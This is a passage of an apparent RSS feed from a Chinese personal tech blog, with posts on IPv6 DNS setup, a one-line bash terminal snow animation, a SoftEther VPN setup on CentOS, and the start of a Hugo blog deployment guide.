    &lt;/a&gt;
    4. 设置DNS AAAA记录
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;大家熟悉的A记录是DNS中IPv4的对应地址，相应的IPv6地址叫AAAA记录。设置成功后就可以直接用DNS进行访问了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#09f;font-style:italic&#34;&gt;# ping6 [Client IPv6 DNS name]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#09f;font-style:italic&#34;&gt;# curl --globoff -6 [Client IPv6 DNS name]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h1 id=&#34;附录&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%99%84%e5%bd%95&#34;&gt;
        ##
    &lt;/a&gt;
    附录
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;ipv4私有地址&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ipv4%e7%a7%81%e6%9c%89%e5%9c%b0%e5%9d%80&#34;&gt;
        #
    &lt;/a&gt;
    IPv4私有地址
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;RFC1918 规定区块名&lt;/th&gt;
&lt;th&gt;IP地址区段&lt;/th&gt;
&lt;th&gt;IP数量&lt;/th&gt;
&lt;th&gt;分类网络说明&lt;/th&gt;
&lt;th&gt;最大CIDR区块（子网络遮罩）&lt;/th&gt;
&lt;th&gt;主机端位长&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;24位区块&lt;/td&gt;
&lt;td&gt;10.0.0.0 – 10.255.255.255&lt;/td&gt;
&lt;td&gt;16,777,216&lt;/td&gt;
&lt;td&gt;单个A类网络&lt;/td&gt;
&lt;td&gt;10.0.0.0/8(255.0.0.0)&lt;/td&gt;
&lt;td&gt;24位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Shared Address Space&lt;/td&gt;
&lt;td&gt;100.64.0.0 - 100.127.255.255&lt;/td&gt;
&lt;td&gt;4,194,304&lt;/td&gt;
&lt;td&gt;64个连续B类网络&lt;/td&gt;
&lt;td&gt;100.64.0.0/10 (255.192.0.0)&lt;/td&gt;
&lt;td&gt;22位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20位区块&lt;/td&gt;
&lt;td&gt;172.16.0.0 – 172.31.255.255&lt;/td&gt;
&lt;td&gt;1,048,576&lt;/td&gt;
&lt;td&gt;16个连续B类网络&lt;/td&gt;
&lt;td&gt;172.16.0.0/12(255.240.0.0)&lt;/td&gt;
&lt;td&gt;20位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16位区块&lt;/td&gt;
&lt;td&gt;192.168.0.0 – 192.168.255.255&lt;/td&gt;
&lt;td&gt;65,536&lt;/td&gt;
&lt;td&gt;256个连续C类网络&lt;/td&gt;
&lt;td&gt;192.168.0.0/16(255.255.0.0)&lt;/td&gt;
&lt;td&gt;16位&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    参考资料
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/IPv6&#34;&gt;https://zh.wikipedia.org/wiki/IPv6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://baike.baidu.com/item/IPv6&#34;&gt;http://baike.baidu.com/item/IPv6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://test-ipv6.com/faq_6to4.html&#34;&gt;http://test-ipv6.com/faq_6to4.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>一行代码让你的字符终端下起雪来！</title>
      <link>/2017/01/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%AD%97%E7%AC%A6%E7%BB%88%E7%AB%AF%E4%B8%8B%E8%B5%B7%E9%9B%AA%E6%9D%A5/</link>
      <pubDate>Sun, 15 Jan 2017 22:08:38 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/01/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%AD%97%E7%AC%A6%E7%BB%88%E7%AB%AF%E4%B8%8B%E8%B5%B7%E9%9B%AA%E6%9D%A5/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/01/snow.gif&#34; alt=&#34;snow&#34;&gt;&lt;/p&gt;
&lt;p&gt;在网上一段[shell](&lt;a href=&#34;http://jerrygamblin.com/2016/12/21/making-it-snow-in-your-terminal/&#34;&gt;http://jerrygamblin.com/2016/12/21/making-it-snow-in-your-terminal/&lt;/a&gt; &amp;ldquo;Jerry Gamblin&amp;rdquo; target=&amp;quot;_blank&amp;quot;)脚本，虽然只有一行但运行后可以在屏幕上实现下雪的效果，实在让人佩服，决定好好研究一下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;0;&lt;span style=&#34;color:#bb60d5&#34;&gt;J&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;--I;&lt;span style=&#34;color:#666&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;do&lt;/span&gt; clear;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;D&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;LINES;&lt;span style=&#34;color:#bb60d5&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;++J**3%COLUMNS,--D;&lt;span style=&#34;color:#666&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;printf&lt;/span&gt; %*s.&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\\&lt;/span&gt;n &lt;span style=&#34;color:#bb60d5&#34;&gt;$S&lt;/span&gt;;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;done&lt;/span&gt;;sleep .1;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;不过原代码虽然简洁但不太容易一下子看明白工作原理，而且只能在命令行上运行无法保存成脚本文件，所以自己按照理解重新写了一遍：
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;$(&lt;/span&gt;tput lines&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;cols&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;$(&lt;/span&gt;tput cols&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    clear
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#666&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;i,i++&lt;span style=&#34;color:#666&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#bb60d5&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;0;r&amp;lt;rows;r++&lt;span style=&#34;color:#666&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;%*s*\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;$((&lt;/span&gt;x**3%cols&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#666&#34;&gt;((&lt;/span&gt;x--&lt;span style=&#34;color:#666&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sleep .1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>搭建SoftEther VPN 服务</title>
      <link>/2017/01/%E6%90%AD%E5%BB%BAsoftether-vpn-%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Tue, 10 Jan 2017 15:22:39 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/01/%E6%90%AD%E5%BB%BAsoftether-vpn-%E6%9C%8D%E5%8A%A1/</guid>
      <description>&lt;p&gt;最近在公司内部架了台服务器给团队的同学们使用，可是在公司外面的时候就没办法再继续访问上面的资源了实在不太方便，虽然利用公司路由器的可以将服务器端口映射出去，但这样做只能访问部分资源，还是搭建一套VPN服务器更加适合所有人的需求。&lt;/p&gt;
&lt;p&gt;研究了一下PPP/L2TP，但PPP已经在iOS设备上见不到了，L2TP又对CentOS 7.3支持不友好，后来找到了SoftEther，发现不仅协议支持全面而且支持命令行／图形界面的管理工具，使用和管理都很方便。&lt;/p&gt;
&lt;h1 id=&#34;搭建方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%90%ad%e5%bb%ba%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    搭建方法
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;通过local-bridge的方式访问远程网络&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%80%9a%e8%bf%87local-bridge%e7%9a%84%e6%96%b9%e5%bc%8f%e8%ae%bf%e9%97%ae%e8%bf%9c%e7%a8%8b%e7%bd%91%e7%bb%9c&#34;&gt;
        #
    &lt;/a&gt;
    通过Local bridge的方式访问远程网络
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;具体过程可以参照&lt;a href=&#34;https://www.softether.org/4-docs/2-howto/1.VPN_for_On-premise/2.Remote_Access_VPN_to_LAN&#34;&gt;官方文档&lt;/a&gt;，这种方法也是我最开始使用的方法，但搭建好之后发现这种连接的设备无法访问搭建VPN的服务器本身，但是我们这台服务器上提供了需要大家访问的资源，因此这对与我们公司来说是无法接受的。原因也可以理解，因为Linux不允许访问Local bridge网络接口对应的IP。具体可以参考官方文档的&lt;a href=&#34;https://www.softether.org/4-docs/1-manual/3._SoftEther_VPN_Server_Manual/3.6_Local_Bridges&#34;&gt;解释&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Limitations within the Linux or UNIX operating system prevent communication with IP addresses assigned to the network adapter locally bridged from the VPN side (Virtual Hub side). The cause of this restriction lies with OS&amp;rsquo;s internal kernel codes rather than with the SoftEther VPN. When wishing to communicate in any form with a UNIX computer used for local bridging from the VPN side (Virtual Hub side), (for instance, when running both the VPN Server / VPN Bridge service &amp;amp; the HTTP Server service and wishing to grant access to the server service from the VPN side as well), prepare and connect a local bridge network adapter and physically connect both it and the existing network adapter to the same segment (as explained in 3.6 Local Bridges, it is recommended to prepare a network adapter for exclusive use in local bridging for this and other situations).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;通过tap网络接口&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%80%9a%e8%bf%87tap%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3&#34;&gt;
        #
    &lt;/a&gt;
    通过tap网络接口
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;后来发现可以通过tap设备来解决访问VPN服务器本身的问题，原理就是创建出一个tap设备并将它桥接到真实设备上。tap设备的配置过程和Local bridge方式基本一致，可以参考下图：
&lt;img src=&#34;https://wordpress.youran.me/wp-content/uploads/2014/12/create-local-bridge.png&#34; alt=&#34;Tap device&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;centos系统设置&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#centos%e7%b3%bb%e7%bb%9f%e8%ae%be%e7%bd%ae&#34;&gt;
        #
    &lt;/a&gt;
    CentOS系统设置
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;完成tap设备配置后，在CentOS上还需要完成下面的设置才可以使用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;防火墙配置，允许VPN服务器的配置和客户连接：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ sudo firewall-cmd –zone&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;public –add-port&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;500/udp –permanent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;$ sudo firewall-cmd –zone&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;public –add-port&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;4500/udp –permanent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;$ sudo firewall-cmd –zone&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;public –add-port&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;1701/udp –permanent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;$ sudo firewall-cmd –zone&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;public –add-port&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;443/tcp –permanent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;&lt;span&gt;$ sudo firewall-cmd –reload&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置tap device：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ sudo brctl addif br0 tap_soft
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;$ sudo brctl show
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;bridge name bridge id STP enabled interfaces
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;br0 8000.00acc3a0fd4d yes p4p2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;&lt;span&gt;tap_soft&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>使用nginx搭建hugo静态blog服务</title>
      <link>/2017/01/%E4%BD%BF%E7%94%A8nginx%E6%90%AD%E5%BB%BAhugo%E9%9D%99%E6%80%81blog%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Tue, 10 Jan 2017 09:16:36 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/01/%E4%BD%BF%E7%94%A8nginx%E6%90%AD%E5%BB%BAhugo%E9%9D%99%E6%80%81blog%E6%9C%8D%E5%8A%A1/</guid>
      <description>&lt;p&gt;之前使用过wordpress搭建过内容管理网站，但是运行环境搭建有些复杂而且页面内容创建需要不够方便，后来关注到静态页面网站框架，发现可以使用markdown进行内容编辑，这对于程序猿来说简直再有好不过了！&lt;/p&gt;
&lt;p&gt;简单检索了一下静态内容管理的有很多实现，Ruby的Jekyll，Python的Sphinx doc，Go的Hugo，因为最近在学习Go所以决定搭建一个Hugo来研究下。&lt;/p&gt;
&lt;h1 id=&#34;使用源码部署hugo&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8%e6%ba%90%e7%a0%81%e9%83%a8%e7%bd%b2hugo&#34;&gt;
        ##
    &lt;/a&gt;
    使用源码部署hugo
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;部署golang&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%83%a8%e7%bd%b2golang&#34;&gt;
        #
    &lt;/a&gt;
    部署golang
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ yum install golang
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;下载hugo源代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%8b%e8%bd%bdhugo%e6%ba%90%e4%bb%a3%e7%a0%81&#34;&gt;
        #
    &lt;/a&gt;
    下载hugo源代码
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ wget https://github.com/spf13/hugo/archive/v0.18.1.tar.gz
  $ tar xf v0.18.1.tar.gz
  $ cd hugo-0.18.1/
  $ export GOPATH=/usr/local/go
  $ go get -v github.com/spf13/hugo
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;hugo的基本使用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#hugo%e7%9a%84%e5%9f%ba%e6%9c%ac%e4%bd%bf%e7%94%a8&#34;&gt;
        ##
    &lt;/a&gt;
    hugo的基本使用
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;创建项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e9%a1%b9%e7%9b%ae&#34;&gt;
